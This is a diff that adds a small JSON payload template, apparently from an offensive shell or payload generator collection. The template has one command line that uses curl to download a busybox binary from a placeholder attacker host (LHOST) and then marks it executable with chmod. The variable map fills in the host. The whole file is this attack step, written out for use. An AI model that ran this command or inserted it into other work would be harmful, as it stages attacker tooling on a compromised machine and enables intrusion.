@@ -1,0 +1,6 @@
+{
+	"line": "curl http://LHOST/busybox && chmod +x busybox",
+	"variables": {
+        "LHOST": "LHOST"
+	}
+}
